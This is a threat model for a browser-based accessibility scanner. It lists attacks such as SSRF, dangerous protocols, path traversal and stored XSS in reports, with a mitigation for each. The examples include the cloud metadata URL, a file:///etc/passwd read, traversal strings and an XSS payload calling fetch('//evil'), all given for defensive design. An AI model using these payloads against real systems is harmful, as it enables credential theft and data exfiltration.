# Threat model

The tool points a real browser at a URL a salesperson typed. Both the URL and
everything the target site returns are hostile input.

Two distinct victims to protect:

- **the machine running the scan** — our infrastructure and internal network
- **the person reading the report** — the report embeds attacker-controlled strings

The second one is the easier to forget and is where an accessibility tool most
plausibly gets exploited: a shop puts `<img alt="<script>...">` on a page, axe
reports the snippet, and the snippet lands unescaped in an HTML report that a
consultant opens.

---

## T1 — SSRF / internal network scanning

**Attack.** `http://169.254.169.254/latest/meta-data/` (cloud credentials),
`http://10.0.0.5:8080/admin`, `http://localhost:6379`. Either typed directly or
reached via a redirect from a public host.

**Mitigation** — `src/security/url-guard.ts`:

1. Scheme must be `http:` or `https:`. Everything else rejected before parsing.
2. Hostname resolved with `dns.lookup(..., { all: true })`. **Every** returned
   address must be public.
3. Blocked ranges: loopback, private (10/8, 172.16/12, 192.168/16), link-local
   (169.254/16 — the cloud metadata range), CGNAT (100.64/10), broadcast,
   reserved, and the IPv6 equivalents including `::1`, `fc00::/7`, `fe80::/10`,
   and IPv4-mapped IPv6 (`::ffff:10.0.0.1`) which is a classic bypass.
4. Literal-IP hostnames are checked directly, without DNS.
5. Credentials in the URL (`http://user:pass@host`) are rejected.
6. Non-standard ports are rejected — only 80, 443, and blank.
7. **Redirects are re-checked.** Playwright follows redirects internally, so the
   guard also runs as a route handler on every request the browser makes; a
   navigation that lands on a disallowed host is aborted.

**Residual risk — DNS rebinding.** Between the guard's `dns.lookup` and the
browser's own resolution, an attacker-controlled DNS server can return a public
IP then a private one. Fully closing this needs connection-level IP pinning,
which is not reachable through Playwright's API. Mitigations in place: the route
handler re-resolves and re-checks on every request, which shrinks but does not
eliminate the window. **Documented rather than hidden.** For untrusted bulk
prospecting, run the scanner in a network-isolated container with an egress
allowlist — that is the real fix, and it is an ops control, not a code one.

## T2 — Dangerous protocols

**Attack.** `file:///etc/passwd`, `javascript:`, `data:text/html,...`, `chrome://`,
`view-source:`, `ftp://`.

**Mitigation.** Scheme allowlist (not a denylist) at the guard, plus the browser
route handler aborts any request whose scheme is not http/https. `file://` cannot
be reached even through a redirect chain.

## T3 — Path traversal into the output directory

**Attack.** Target domain `../../etc/cron.d` or `..%2f..%2f` used to build the
report filename.

**Mitigation.** Output filenames are derived from the hostname through
`safeSlug()`, which allows `[a-z0-9.-]` only, collapses runs, strips leading dots,
and truncates. The result is then joined to the resolved output directory and the
final path is asserted to still be inside it.

## T4 — Command injection

**Attack.** Target-derived strings reaching a shell.

**Mitigation.** The tool never spawns a shell. No `child_process`, no template
strings into commands. Playwright is used as a library.

## T5 — Stored XSS in the generated report

**Attack.** The shop serves `<a aria-label="</script><script>fetch('//evil')">`.
axe returns the snippet; the report embeds it; the consultant opens the report
locally, where it runs with `file://` privileges.

**Mitigation.** Everything crossing from the browser to the report is treated as
untrusted:

- `escapeHtml()` on every interpolation of target-derived text, including inside
  `<pre>`, attribute values, and `<title>`.
- Escapes `& < > " '` **and** `/` — the last one stops `</script>` from closing a
  script block if a value is ever placed in one.
- Snippets truncated to 400 characters before escaping.
- The report contains **no `<script>` element at all** and no inline event
  handlers, so there is nothing for injected markup to break out into. Interactive
  behaviour uses `<details>`, which needs no JavaScript.
- Target URLs rendered as links are re-validated as http/https; anything else is
  rendered as plain text.

This is unit-tested: `tests/report.test.ts` feeds hostile strings through the
whole pipeline and asserts no executable markup survives.

## T6 — Unbounded crawling / resource exhaustion

**Attack.** Infinite calendar URLs, faceted-search combinatorial explosion, a
10 GB response, a page that never fires `load`.

**Mitigation** — all in `src/config.ts`:

| Limit | Scan | Prescan |
|---|---|---|
| Max pages | 12 | 4 |
| Max crawl depth | 2 | 1 |
| Per-page navigation timeout | 20s | 15s |
| Whole-run budget | 5 min | 90s |
| Max queued URLs | 300 | 60 |
| Response size cap | 8 MB | 8 MB |
| Delay between requests | 400ms | 400ms |

Plus: normalized-URL dedup, same-registrable-domain only, and a hard cap on
in-flight pages (sequential by default). The run budget is checked between pages,
so a slow site degrades to fewer pages rather than hanging.

## T7 — Doing something destructive on the target

**Attack surface is our own behaviour**, not theirs. A crawler that clicks
buttons can add to cart, submit a contact form, or trigger a real order.

**Mitigation.**

- Navigation is **GET only**. The crawler never calls `.click()`, never submits a
  form, never fills an input.
- Only `<a href>` values are followed. `<button>`, `<form action>`, and
  JavaScript-driven navigation are ignored as link sources.
- Checkout is visited only as a landing page (an empty-cart checkout URL).
  Nothing is ever placed in a cart first, so there is nothing to purchase.
- URLs matching a destructive-intent pattern (`/logout`, `/signout`,
  `/cart/add`, `/cart/clear`, `/checkout/complete`, `?delete=`, `?remove=`,
  `/admin`) are dropped from the queue regardless of depth.
- Authentication is never attempted and never bypassed. A page that returns
  401/403 is recorded as "not tested — requires authentication".
- `robots.txt` is fetched and obeyed.

## T8 — Executing target code outside the sandbox

**Mitigation.** Target JavaScript runs only inside Chromium's own sandbox. The
Node process evaluates nothing that came from the page. Chromium is launched with
default security settings — `--no-sandbox` and `--disable-web-security` are not
used, and there is no flag to enable them.

The scripts passed to `page.evaluate()` are ours, written literally in this
repository. Their *return values* are untrusted and are validated for shape before
use.

## T9 — Leaking one target's data into another's report

**Mitigation.** A fresh incognito browser context per scan; no persistent profile;
no cookie jar shared between runs. Storage state is never saved.

## T10 — Test escape hatch used in production

`allowPrivateTargets` exists so the test suite can scan a fixture server on
127.0.0.1.

**Mitigation.** Defaults to `false`. Settable only by passing it explicitly in
code or by `--allow-private-targets`, which prints a prominent warning banner to
stderr on every run. It is never read from an ambient environment variable, so it
cannot be switched on by a stray export in CI. `tests/url-guard.test.ts` asserts
the default is off.

---

## Deliberately out of scope for v1

Honest statements of what is *not* defended against:

- **DNS rebinding**, per T1. Needs an ops-level egress allowlist.
- **A malicious page exploiting a Chromium 0-day.** Keep Playwright current; run
  bulk prospecting in a disposable container.
- **Denial of service against the target.** The tool is polite (sequential, 400ms
  delay, ≤12 pages) but does not implement adaptive back-off on 429/503.
  It stops on repeated failures; it does not negotiate.
- **Legal authorization to scan.** The tool cannot know whether the operator has
  permission to scan a given site. Scanning publicly reachable pages of a
  prospect's shop at this volume is ordinary crawler behaviour, but the operator
  is responsible for that judgement, not the tool.
